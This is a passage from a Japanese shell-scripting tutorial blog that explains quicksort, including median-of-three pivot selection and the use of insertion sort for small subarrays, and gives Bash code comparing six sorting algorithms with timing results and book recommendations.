Hoareが発明しました。\nクイックソートは誰もが人気ナンバーワンと認めるソートアルゴリズムです。\nそれには 理由があります。\nクイックソートは多くの場合に最も高速であり、O(N＊log(N)) の時間で動作します。\nただしこれはあくまでも、オンメモリのソートの場合です。\nディスクファイ の上にあるデータ(しかもメモリに一度に収まりきれないほどの大量のデータ)をソートする場合には、別の方法を使う必要があります。\n前に、クイックソートは O(N＊log(N)) の時間で実行される、といいました。\nさらに、マー ジソートを勉強したとき、このような対数型の実行時間は、分割統治型のアルゴリズムの共通的な特徴だといいました。\n再帰メソッドが項目の範囲を次々と二分しながら、それら小部分に対して自分自身を呼び出していくというマージソートやクイックソートのようなアルゴリズムは、分割統治型アルゴリズムの典型です。この場合、 対数の基数は2ですから、実行時間は O(N＊log(N))に比例すると言えます。\n単純なクイックソートでは、ソート済みや、逆順状態のデータに対しては、O(N^2) へと退化します。\n「３つのメジアン法」による改良で、ソート済みデータの場合の O(N^2) の退化を防ぐことができます。\n「３つのメジアン」による分割アルゴリズムの内側のwhileループで配列の終端をテストする必要がなくなります。\nクイックソートの部分配列のソートには、「挿入ソート」が使われます。\nそれでは、これまで学習したすべてのソートを一枚のプログラムソースにまとめた完全版をいかに示します。\nプログラムソース この章で使っているプログラムソースは以下にあります。\n06SortAlgorithm.sh ソート\n#!/bin/bash ########################################## # Bash(シェルスクリプト)で学ぶ # アルゴリズムとデータ構造 # 一般社団法人共同通信社情報技術局 # 鈴木維一郎(suzuki.iichiro@kyodonews.jp) # # # ステップバイステップでアルゴリズムを学ぶ # # 目次 # ソートアルゴリズム # バブルソート # 選択ソート # 挿入ソート # マージソート # シェルソート # クイックソート # ########################################## ## # display() # 共通部分 function display(){ for((i=0;i\u0026lt;nElems;i++)){ echo \u0026#34;$i\u0026#34; \u0026#34;${array[i]}\u0026#34;; } echo \u0026#34;-----\u0026#34;; } ## # insert() # 配列を作成 function insert(){ array[nElems++]=\u0026#34;$1\u0026#34;; } ## # setArray() # 配列をセット function setArray(){ nElems=0; for((i=0;i\u0026lt;$1;i++)){ insert $(echo \u0026#34;$RANDOM\u0026#34;); } } # ############################################# # 1. バブルソート 13404mm # https://ja.wikipedia.org/wiki/バブルソート # https://www.youtube.com/watch?v=8Kp-8OGwphY # 平均計算時間が O(N^2) # 安定ソート # 比較回数は「 n(n-1)/2 」 # 交換回数は「 n^2/2 」 # 派生系としてシェーカーソートやコムソート ## function bubbleSort(){ local i j t;# t:temp for((i=nElems;i\u0026gt;0;i--)){ for((j=0;j\u0026lt;i-1;j++)){ ((array[j]\u0026gt;array[j+1]))\u0026amp;\u0026amp;{ t=\u0026#34;${array[j]}\u0026#34;; array[j]=\u0026#34;${array[j+1]}\u0026#34;; array[j+1]=\u0026#34;$t\u0026#34;; } } } } # ########################################## # 選択ソート 3294mm # https://ja.wikipedia.org/wiki/選択ソート # https://www.youtube.com/watch?v=f8hXR_Hvybo # 平均計算時間が O(N^2) # 安定ソートではない # 比較回数は「 n(n-1)/2 」 # 交換回数は「 n-1 」 ## # selectionSort() # 選択ソート function selectionSort(){ local i j t m;# t:temp m:min for((i=0;i\u0026lt;nElems;i++)){ m=\u0026#34;$i\u0026#34;; for((j=i+1;j\u0026lt;nElems;j++)){ ((array[m]\u0026gt;array[j]))\u0026amp;\u0026amp; m=\u0026#34;$j\u0026#34;; } ((m==i))\u0026amp;\u0026amp; continue; t=\u0026#34;${array[m]}\u0026#34;; array[m]=\u0026#34;${array[i]}\u0026#34;; array[i]=\u0026#34;$t\u0026#34;; } } # ########################################## # 挿入ソート 3511mm # https://ja.wikipedia.org/wiki/挿入ソート # https://www.youtube.com/watch?v=DFG-XuyPYUQ # 平均計算時間が O(N^2) # 安定ソート # 比較回数は「 n(n-1)/2以下 」 # 交換回数は「 約n^2/2以下 」 ## # insertionSort() # 挿入ソート function insertionSort(){ local o i t;# o:out i:in t:temp for((o=1;o\u0026lt;nElems;o++)){ t=\u0026#34;${array[o]}\u0026#34;; for((i=o;i\u0026gt;0\u0026amp;\u0026amp;array[i-1]\u0026gt;t;i--)){ array[i]=\u0026#34;${array[i-1]}\u0026#34;; } array[i]=\u0026#34;$t\u0026#34;; } } # ############################################# # マージソート 1085mm # https://ja.wikipedia.org/wiki/マージソート # https://www.youtube.com/watch?v=EeQ8pwjQxTM # 平均計算時間が O(N(Log N)) # 安定ソート # 50以下は挿入ソート、5万以下はマージソート、 # あとはクイックソートがおすすめ。 # バブルソート、挿入ソート、選択ソートがO(N^2)の # 時間を要するのに対し、マージ # ソートはO(N*logN)です。 # 例えば、N(ソートする項目の数）が10,000ですと、 # N^2は100,000,000ですが、 # n*logNは40,000です。 # 別の言い方をすると、マージソートで４０秒を # 要するソートは、挿入ソートでは約２８時間かかります。 # マージソートの欠点は、ソートする配列と同サイズ # の配列をもう一つ必要とする事です。 # 元の配列がかろうじてメモリに治まるという大きさ # だったら、マージソートは使えません。 ## # mergeSortLogic() # function mergeSortLogic(){ local f=$1 m=$2 l=$3;# f:first m:mid l:last w:workArray local n i j n1; ((n=l-f+1)); for((i=f,j=0;i\u0026lt;=l;)){ w[j++]=\u0026#34;${array[i++]}\u0026#34;; } ((m\u0026gt;l))\u0026amp;\u0026amp;((m=(f+l)/2)); ((n1=m-f+1)); for((i=f,j=0,k=n1;i\u0026lt;=l;i++)){ { ((j\u0026lt;n1))\u0026amp;\u0026amp;{ ((k==n))||{ ((${w[j]}\u0026lt;${w[k]})) } } }\u0026amp;\u0026amp;{ array[i]=\u0026#34;${w[j++]}\u0026#34;; }||{ array[i]=\u0026#34;${w[k++]}\u0026#34;; } } } ## # mergeSort() # マージソート function mergeSort(){ local f=\u0026#34;$1\u0026#34; l=\u0026#34;$2\u0026#34; m=;# f:first l:last m:mid ((l\u0026gt;f))||return 0; m=$(((f+l)/2)); mergeSort \u0026#34;$f\u0026#34; \u0026#34;$m\u0026#34;; mergeSort \u0026#34;$((m+1))\u0026#34; \u0026#34;$l\u0026#34; mergeSortLogic \u0026#34;$f\u0026#34; \u0026#34;$m\u0026#34; \u0026#34;$l\u0026#34;; } # ############################################### # シェルソート 1052mm # https://ja.wikipedia.org/wiki/シェルソート # https://www.youtube.com/watch?v=M9YCh-ZeC7Y # 平均計算時間が O(N((log N)/(log log N))^2) # 安定ソートではない # 挿入ソート改造版 # ３倍して１を足すという処理を要素を越えるまで行う ## # shellSort() # シェルソート function shellSort(){ local s=1 in t;#s:shell in:inner t:temp while((s\u0026lt;nElems/3));do s=$((s*3+1)); done while((s\u0026gt;0));do for((i=s;i\u0026lt;nElems;i++)){ t=\u0026#34;${array[i]}\u0026#34;; in=\u0026#34;$i\u0026#34;; while((in\u0026gt;s-1\u0026amp;\u0026amp;array[in-s]\u0026gt;=t));do array[in]=\u0026#34;${array[in-s]}\u0026#34;; in=$((in-s)); done array[in]=\u0026#34;$t\u0026#34;; } s=$(((s-1)/3)); done } # ############################################### # クイックソート 1131mm # https://ja.wikipedia.org/wiki/クイックソート # https://www.youtube.com/watch?v=aQiWF4E8flQ # 平均計算時間が O(n Log n) # 安定ソートではない # 最大計算時間が O(n^2) # データ数が 50 以下なら挿入ソート (Insertion Sort) # データ数が 5 万以下ならマージソート (Merge Sort) # データ数がそれより多いならクイックソート (Quick Sort) ## # quickSort() # クイックソート function quickSort(){ local -i l r m p t i j k;#r:right l:left m:middle p:part t:temp ((l=i=$1,r=j=$2,m=(l+r)/2)); p=\u0026#34;${array[m]}\u0026#34;; while((j\u0026gt;i));do while [[ 1 ]];do ((array[i]\u0026lt;p))\u0026amp;\u0026amp;((i++))||break; done while [[ 1 ]];do ((array[j]\u0026gt;p))\u0026amp;\u0026amp;((j--))||break; done ((i\u0026lt;=j))\u0026amp;\u0026amp;{ t=\u0026#34;${array[i]}\u0026#34;; array[i]=\u0026#34;${array[j]}\u0026#34;; array[j]=\u0026#34;$t\u0026#34;; ((i++,j--)); } done ((l\u0026lt;j)) \u0026amp;\u0026amp; quickSort $l $j; ((r\u0026gt;i)) \u0026amp;\u0026amp; quickSort $i $r; } ## # 実行メソッド ## function SortCase(){ setArray $1; # display; case \u0026#34;$2\u0026#34; in bubbleSort) bubbleSort;; selectionSort) selectionSort;; insertionSort) insertionSort;; mergeSort) mergeSort 0 $((nElems-1));; shellSort) shellSort;; quickSort) quickSort 0 $((nElems-1));; esac # display; } ## # ソート各種 # 必要であればコメントアウトなどしてください。 function Sort(){ echo -n \u0026#34;bubbleSort\u0026#34;; time SortCase 1000 \u0026#34;bubbleSort\u0026#34;; echo \u0026#34;\u0026#34;; echo -n \u0026#34;selectionSort\u0026#34;; time SortCase 1000 \u0026#34;selectionSort\u0026#34;; echo \u0026#34;\u0026#34;; echo -n \u0026#34;insertionSort\u0026#34;; time SortCase 1000 \u0026#34;insertionSort\u0026#34;; echo \u0026#34;\u0026#34;; echo -n \u0026#34;mergeSort\u0026#34;; time SortCase 1000 \u0026#34;mergeSort\u0026#34;; echo \u0026#34;\u0026#34;; echo -n \u0026#34;shellSort\u0026#34;; time SortCase 1000 \u0026#34;shellSort\u0026#34;; echo \u0026#34;\u0026#34;; echo -n \u0026#34;quickSort\u0026#34;; time SortCase 1000 \u0026#34;quickSort\u0026#34;; echo \u0026#34;\u0026#34;; } ## # メイン Sort; exit; 実行結果 bash-5.1$ bash 06SortAlgorithm.sh bubbleSort real\t0m12.639s user\t0m11.889s sys\t0m0.657s selectionSort real\t0m8.200s user\t0m7.484s sys\t0m0.664s insertionSort real\t0m5.286s user\t0m4.604s sys\t0m0.657s mergeSort real\t0m1.644s user\t0m1.025s sys\t0m0.618s shellSort real\t0m1.476s user\t0m0.819s sys\t0m0.655s quickSort real\t0m1.438s user\t0m0.790s sys\t0m0.648s bash-5.1$ 「ざっくり」シリーズのご紹介 【アルゴリズム ソート比較】ざっくりわかるシェルスクリプト２０\nhttps://suzukiiichiro.github.io/2022-11-02-01-sortcomp-suzuki/\n【アルゴリズム クイックソート】ざっくりわかるシェルスクリプト１９\nhttps://suzukiiichiro.github.io/2022-11-01-01-quicksort-suzuki/\n【アルゴリズム シェルソート】ざっくりわかるシェルスクリプト１８\nhttps://suzukiiichiro.github.io/2022-10-27-01-shellsort-suzuki/\n【アルゴリズム マージソート】ざっくりわかるシェルスクリプト１７\nhttps://suzukiiichiro.github.io/2022-10-19-01-mergesort-suzuki/\n【アルゴリズム 連結リスト】ざっくりわかるシェルスクリプト１６\nhttps://suzukiiichiro.github.io/posts/2022-10-18-01-list-suzuki/\n【アルゴリズム 再帰】ざっくりわかるシェルスクリプト１５\nhttps://suzukiiichiro.github.io/posts/2022-10-07-01-algorithm-recursion-suzuki/\n【アルゴリズム キュー】ざっくりわかるシェルスクリプト１４\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-queue-suzuki/\n【アルゴリズム スタック】ざっくりわかるシェルスクリプト１３\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-stack-suzuki/\n【アルゴリズム 挿入ソート】ざっくりわかるシェルスクリプト１２\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-insertionsort-suzuki/\n【アルゴリズム 選択ソート】ざっくりわかるシェルスクリプト１１\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-selectionsort-suzuki/\n【アルゴリズム バブルソート】ざっくりわかるシェルスクリプト１０\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-bubblesort-suzuki/\n【アルゴリズム ビッグオー】ざっくりわかるシェルスクリプト９\nhttps://suzukiiichiro.github.io/posts/2022-10-04-01-algorithm-bigo-suzuki/\n【アルゴリズム ２次元配列編】ざっくりわかるシェルスクリプト８\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-eval-array-suzuki/\n【アルゴリズム 配列準備編】ざっくりわかるシェルスクリプト７\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-array-suzuki/\n【アルゴリズム 配列編】ざっくりわかるシェルスクリプト６\nhttps://suzukiiichiro.github.io/posts/2022-09-27-01-array-suzuki/\n【grep/sed/awkも】ざっくりわかるシェルスクリプト５\nhttps://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/\n【grep特集】ざっくりわかるシェルスクリプト４\nhttps://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト３\nhttps://suzukiiichiro.github.io/posts/2022-01-13-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト２\nhttps://suzukiiichiro.github.io/posts/2022-01-12-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト１\nhttps://suzukiiichiro.github.io/posts/2022-01-07-01-suzuki/\n【TIPS】ざっくりわかるシェルスクリプト\nhttps://suzukiiichiro.github.io/posts/2022-09-26-01-tips-suzuki/\n書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-11-02T10:37:46+09:00","image":"https://suzukiiichiro.github.io/posts/2022-11-02-01-sortcomp-suzuki/algorithm_hu819a85d642270e08bd651dabf1e2fbd4_42552_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-11-02-01-sortcomp-suzuki/","title":"【アルゴリズム ソート比較】ざっくりわかるシェルスクリプト２０"},{"content":"クイックソート クイックソートは、誰もが人気ナンバーワンと認めるソートアルゴリズムです。\nクイックソート 理由として、クイックソートは多くの場合に最も高速です。\nO(N＊log(N))\nクイックソート クイックソートは、１９６２年にC.A.R Hoareが発明しました。\nここまで習熟したいくつかのソートの知識は、クイックソートを理解するためのステップだったと言っても過言ではありません。\nクイックソート 習熟のステップ １.クイックソートの基本型\nクイックソート このページでは、クイックソートの説明をします。\n実装に関して、いくつかの工夫を盛り込みます。\nクイックソートの基本形に加わる工夫は以下の２つです。\n２.Median of Three 分割値（pivot）の選び方と実装\n３.挿入ソート うんと小さな部分配列に適切なアルゴリズム\nこのページでは、クイックソートの「基本形」「メジアン」「挿入ソート導入版」の３つのステップでクイックソートを学びます。\nではさっそく、「クイックソート基本形」を見ていきましょう。\nクイックソート基本型 クイックソートの基本形を説明します。\nクイックソートのアルゴリズムは、pivot(分割値）を区切りとして、配列を２つの部分配列に分割します。\nまた、その部分配列に対して自分自身を呼び出してクイックソートする、という再帰的な動作を繰り返します。\nクイックソート クイックソート基本型のアルゴリズム プログラムソースでは、クイックソート基本型の関数をquickSort1()としました。\nメジアン対応（以降のセクションで説明します）をquickSort2()、挿入ソート導入版(以降のセクションで説明します）をquickSort3()という関数で呼び出します。\nプログラムソースでは、３つのクイックソートは、一枚のbash/シェルスクリプトに同梱されています。\n見比べたり、速度などを比較したりすると良いでしょう。\n基本形：quickSort1()メソッド まずは、quickSort1() クイックソートの基本形の関数を見てみましょう。クイックソート基本型のメソッドはかなり単純です。\nこの章で使っているプログラムソースは以下にあります。\n05_3QuickSort.sh クイックソート\nクイックソート基本形のおおまかなロジックは、３つの基本的なステップがあります。\n１．配列ないし部分配列を左（小さなキー）と、右（大きなキー）のグループに分離する。\n２．左側に関して自分自身を呼び出してソートする。\n３．右側に関して自分自身を呼び出してソートする。\nでは、３つを順番に説明します。\n１．配列ないし部分配列を左（小さなキー）と、右（大きなキー）のグループに分離する。\nクイックソート ２．左側に関して自分自身を呼び出してソートする。\nクイックソート ３．右側に関して自分自身を呼び出してソートする。\nクイックソート 分割後１，２，３のステップを行ったあとは、左側の部分配列の項目はすべて、右側の項目よりも小さくなっています。\n次に、その左側の部分配列と右側の部分配列をソートしたら、配列全体がソートされます。\nでも、それらの部分配列をどうやってソートするか？\nそれは、クイックソートが、自分をその部分配列に対して呼び出すことによって、ソートを行います。\n上記QuickSort1()メソッドにわたす引数は、これからソートする配列（または部分配列）の左端の右端を指定します。\nメソッドは最初に、その配列の成分が１つかどうかを調べます。\n成分が１つなら、その配列はソート済みであるとみなされ、メソッドは直ちにリターンします。\nこれが再帰処理の基底条件です。\n## # quickSort1() # クイックソート基本形 function quickSort1(){ local left=\u0026#34;$1\u0026#34; ; local right=\u0026#34;$2\u0026#34; ; local size=$((right-left)) ; # サイズが１なら if [ \u0026#34;$size\u0026#34; -le 0 ]; then return; # ソート済み else # サイズが２以上 #範囲を分割する 戻り値は $pertision pivot=\u0026#34;${array[$right]}\u0026#34;; pertisionIt1 \u0026#34;$left\u0026#34; \u0026#34;$right\u0026#34; \u0026#34;$pivot\u0026#34;; #左側をソート quickSort1 \u0026#34;$left\u0026#34; \u0026#34;$((pertision-1))\u0026#34; ; #右側をソート quickSort1 \u0026#34;$((pertision+1))\u0026#34; \u0026#34;$right\u0026#34; ; fi } 基本形：partitionIt1()メソッド 配列のセルが２つ以上ある場合には、partitionIt1()メソッドを呼び出して、その配列を分割します。\nこのメソッドは、分割後の右（大きなキー）のグループの左端の成分を指すインデクスを、変数partitionに返します。\npartitionのこの値は、２つのグループの境界を指しています。\nクイックソート partitionIt1()を呼び出して配列を分割したら、分割後の２つの部分配列（左側と右側）に対してそれぞれ、quickSort1()を再帰的に呼び出します。\nただし、配列のpartitionインデクスの位置にある項目は、すでに正しいソート位置にありますから、これら２つの再帰呼び出しの引数となる２つの配列には含めません。\nそこで、再帰呼び出しの引数はそれぞれ、partition-1、およびpartition+1となっています。\n## # pertionIt1() # 基本形のクイックソートで言うところのソートは # このメソッドで行う # メジアン・挿入ソート導入版といった共通メソッドの # pertisionIt()とはちょっと内容が異なる function pertisionIt1(){ #最初の成分の右 local leftPtr=$(($1-1)) ; #分割値の左 local rightPtr=\u0026#34;$right\u0026#34; ; # local pivot=\u0026#34;$3\u0026#34; ; while :; do #より大きい項目を見つける while ((array[++leftPtr]\u0026lt;pivot)); do : done #より小さい項目を見つける while ((rightPtr\u0026gt;0 \u0026amp;\u0026amp; array[--rightPtr]\u0026gt;pivot)); do : done #ポインタが交差したら if [ \u0026#34;$leftPtr\u0026#34; -ge \u0026#34;$rightPtr\u0026#34; ]; then #分割は終了 break ; else #交差していないので成分を入れ替える local tmp=\u0026#34;${array[leftPtr]}\u0026#34; ; array[leftPtr]=\u0026#34;${array[rightPtr]}\u0026#34; ; array[rightPtr]=\u0026#34;$tmp\u0026#34; ; fi done #分割値をリストア local tmp=\u0026#34;${array[leftPtr]}\u0026#34; ; array[leftPtr]=\u0026#34;${array[right]}\u0026#34; ; array[right]=\u0026#34;$tmp\u0026#34; ; #分割値の位置を返す pertision=\u0026#34;$leftPtr\u0026#34; ; } 基本形：分割値（pivot）を選ぶ partitionIt1()を呼び出す時、引数pivot（＝分割値）の値はどうやって決めるべきでしょうか？\n分割地は、任意の値ではなく、これからソートするデータの中に実際にある値であるべきである。 そして、分割地を実際のデータの中からランダムに選ぶ。たとえば、分割する部分配列の必ず右端の項目、と決めたらどうだろう？ 分割後に、分割値として選んだ項目を、左と右の部分配列の境界に挿入したら、その項目は最終的なソート済みの位置に収まったことになる。 クイックソート 上の最後の点が、納得できないかもしれませんね。\nでも、あるデータ項目のキーの値を、分割値として選んで分割をしたら、左の部分配列にはその分割値よりも小さな項目がすべて入り、右の部分配列には大きな項目がすべて入るのですから、ちょうど両者の境界にそ の分割値として選んだ項目を挿入すれば、その項目は、今後ソート過程がどのように進もうとも、それ以上右にも左にも動くはずがありません。 でしょう?\nクイックソート 言い換えると、今後のソート過程は、それぞれ左右の部分配列の中だけで別々に進行するのです。\n境界に挿入したその項目は、もはや動きませんし、動かす理由が今後とも生じません。\nしかし、上記の図では、pivotを中心に配列を途中で切断して動かすという, 物理的にありえないことをしています。\n実際には、左右の部分配列の境界に分割値の項目を挿入するという操作はどうやって行うのでしょうか?\n右側の部分配列のすべての項目を１セルずつシフトして、分割値を入れるための空きを作る。という方法もあります。でもそれは効率が悪いし、しかも不必要な処理です。\nなぜなら、左右の部分配列の中身は、まだソートされていないから、現時点の並び方を保存するために、前項目をお行儀よくシフトしても意味がないのです。\nそこで、分割値を境界に挿入するためには、右側の部分配列の左端（＝境界位置）の項目と分割値を単純に入れ替えます。\nクイックソート 分割値としては、「配列の右端」の項目を便宜的に選んでいますね。\nですから、その項目を「分割後の右側の部分配列の左端」の項目と入れ替えたとき、後者は配列の右端へ移動しますから、相変わらず右側部分配列の一員のままです。\nすなわち、分割の結果は保存されます。\nですから、上のように入れ替えるだけでOKなのです。\n分割値の項目を partition の位置へ入れ替えたら、その項目は最終的な位置に収まったことになります。\nその後の処理は、その項目の右側または左側で行われ、分割値自身は動きません。\n今後それは、アクセスされることすらないのです!\nクイックソート 9 はピボット (矢印で示される 8) よりも大きいため、何も起こりません。\nクイックソート 11 はピボットよりも大きいので、先に進みます。\nクイックソート 7 はピボットよりも小さいため、濃い灰色になります。\nインデックス j を１つ進め、位置 i と j の要素を交換します。\nクイックソート 14 も、ピボットよりも大きいです。\nクイックソート 4 はピボットよりも小さいため、濃いグレーに色付けし、インデックス j を進めてスワップします。\nクイックソート 9 はピボットよりも大きく、続けます…\nクイックソート 6 の方が小さいので、j を進めてスワップします。\nクイックソート 2も小さいので、また入れ替えて…\nクイックソート …そして最後に、インデックス j を最後にもう一度進め、指定された位置でピボットを交換します。\nヒント 逆順にソートされた１００本の棒をソートしたとします。\n動きがかなり遅いことになります。それは分割によって大きな部分配列が大量に作られるからです。問題は分割値の決め方にあるのです。 Median of Three 分割値（pivot）の選び方 この章で使っているプログラムソースは以下にあります。\n05_3QuickSort.sh クイックソート\nクイックソートの分割値の選び方は、これまでに色んな方法が提案されています。\nその選び方は、簡単でしかも最大や最小の値には決してならない、という方法でなければ常に良い選択になるとは限りません。\nでは、すべての項目の値を調べて、そのメジアン（データ全体の中で、その値より大きな項目の一人、小さな項目の数がちょうど半々になるようなデータ中の実在する値）を取る、という方法はどうでしょう？\n配列の最初の項目と、最後の項目、そして中央の項目、以上３つの項目のメジアンを分割値として選ぶ、という方法です。\nクイックソート ３項目のメジアンを求めることは、全項目のメジアンを求めるよりも当然ながら速いし、それにまた、データがすでにソート済み、または逆順ソート状態だったときでも、最大や最小の項目は選ばれません。\nこの「３のメジアン法」を使って最悪に近い値が選ばれてしまう、という可能性はゼロではありませんが, それはまあ、滅多にないことです。\n通常は、３のメジアンは分割値を選ぶ最良の方法と見なされています。\nクイックソート 「３つのメジアン法」には、良い分割値を選ぶことに加えて、もうひとつの利点があります。\n内側の２つ目のwhileループの、rightPtr\u0026gt;left というテストが省略できるので、アルゴリズムのスピードがやや上がります。\nなぜ、そのテストを省略できるのでしょうか?\n「3のメジアン法」では、分割値が決まるだけではなく、その3つの項目がついでにソートされてしまうから, whileループでのテストを省略できるというメリットがあります。\n## # pertisionIt() # function pertisionIt(){ #最初の成分の右 local leftPtr=$1 ; #分割値の左 local rightPtr=$(($2-1)) ; local pivot=$3 while :; do #より大きい項目を見つける while (( \u0026#34;${array[++leftPtr]}\u0026#34; \u0026lt; \u0026#34;$pivot\u0026#34; )); do : done #より小さい項目を見つける while (( \u0026#34;${array[--rightPtr]}\u0026#34; \u0026gt; \u0026#34;$pivot\u0026#34; )); do : done #ポインタが交差したら if [ \u0026#34;$leftPtr\u0026#34; -ge \u0026#34;$rightPtr\u0026#34; ]; then #分割は終了 break ; else # leftPtr rightPtr #交差していないので成分を入れ替える local tmp=\u0026#34;${array[leftPtr]}\u0026#34; ; array[leftPtr]=\u0026#34;${array[rightPtr]}\u0026#34; ; array[rightPtr]=\u0026#34;$tmp\u0026#34; ; fi done #leftPtr right-1 #分割値をリストア local tmp=\u0026#34;${array[leftPtr]}\u0026#34; ; array[leftPtr]=\u0026#34;${array[right-1]}\u0026#34; ; array[right-1]=\u0026#34;$tmp\u0026#34; ; #分割値の位置を返す pertision=\u0026#34;$leftPtr\u0026#34; ; } 左端、中央、右端の3つの項目がソートされ、そのメジアンが分割値として選ばれると、部分配列の左端の項目はすでに確実に分割値以下であり、右端の項目は確実に分割値以上です。\nそうすると, leftPtrやrightPtr が指す配列インデクスは、テストを省いても、配列の両端を踏み越すことはなくなります (その項目で矢印は停止して, 項目の入れ替え をしようとしますが、そのときは同時に、相方の矢印と出会ってしまっているので、分割の完了を悟るのです)。\nこのようなleftとrightの値を、ポインタやインデクス変数が配列境界を踏み越えないようにするための歩哨 (sentinel (s)) と呼びます。\n「３のメジアン法」のもうひとつの利点は、左、中央、右の計３項目がソートされると、分割の過程ではそれら３つの成分を調べなくてよいことです。\n分割は、left + 1 および right - 1 から開始できます。\nなぜなら, leftとrightにはすでに分割済みの項目が収まっているからです。\nメジアンを分割値として選んだのだから、left は確かに分割値よ 小さな値ですし、したがって最終的に分割された左側グループの一員です。\n同じく、right は分割値より大きな項目ですから、分割後の右側グループの一員です。\n以上のように、「３のメジアン法」による分割は、 ソート済みデータの場合にO(N2) の実行性能になることを防ぐだけではなく、分割アルゴリズムの内側ループをスピードアップし、また、分割する項目の数をやや減らします。\nクイックソート ## # medialOf3() # function medianOf3(){ local left=$1 ; local right=$2 ; local center=\u0026#34;$(( (left+right) / 2 ))\u0026#34; ; if [ \u0026#34;${array[left]}\u0026#34; -gt \u0026#34;${array[center]}\u0026#34; ]; then # left / centerを正順化 local tmp=\u0026#34;${array[left]}\u0026#34; ; array[left]=\u0026#34;${array[center]}\u0026#34; ; array[center]=\u0026#34;$tmp\u0026#34; ; fi if [ \u0026#34;${array[left]}\u0026#34; -gt \u0026#34;${array[right]}\u0026#34; ]; then # left / rightを正順化 local tmp=\u0026#34;${array[left]}\u0026#34; ; array[left]=\u0026#34;${array[right]}\u0026#34;; array[right]=\u0026#34;$tmp\u0026#34; ; fi if [ \u0026#34;${array[center]}\u0026#34; -gt \u0026#34;${array[right]}\u0026#34; ]; then # center rightを正順化 local tmp=\u0026#34;${array[center]}\u0026#34; ; array[center]=\u0026#34;${array[right]}\u0026#34; ; array[right]=\u0026#34;$tmp\u0026#34; ; fi # 分割値をrightに local tmp=\u0026#34;${array[center]}\u0026#34; ; array[center]=\u0026#34;${array[right-1]}\u0026#34; ; array[right-1]=\u0026#34;$tmp\u0026#34; ; #メジアンの値を返す median=\u0026#34;${array[right-1]}\u0026#34; ; } 挿入ソート うんと小さな部分配列のソート この章で使っているプログラムソースは以下にあります。\n05_3QuickSort.sh クイックソート\n小さな部分配列に対して挿入ソートを使うと、少なくとも例題実装 の中では最高速という結果になりました。\nクイックソートの段階での比較や、コピーの回数は大きく減りますが、しかしその分、挿入ソートでの比較やコピーの回数が増えてしまいます。\nですから、小さな部分配列に対して挿入ソートを使うことは、それほど大きな改良ではありません。\nしかしそれでも、クイックソートをぎりぎりまで高速化しなければならない場合には、 利用価値のある方法といえます。\nクイックソートのもうひとつの改良アイデアは、分割によってできる部分配列がある程度大きい間はクイックソートをして、それ以降の小さな部分配列はそのまま放置します。\nそうすると配列全体としては、「ほとんどソートされた」状態になります。\nその配列全体に対して、今度は挿入ソートを適用します。\n挿入ソートは、ほとんどソートされた状態の配列に対しては高速ですから、何人かの専門家はこの方法を推奨しています。\nクイックソート #!/bin/bash # ######################################################## # \u0026lt;\u0026gt;quickSort # クイックソート # 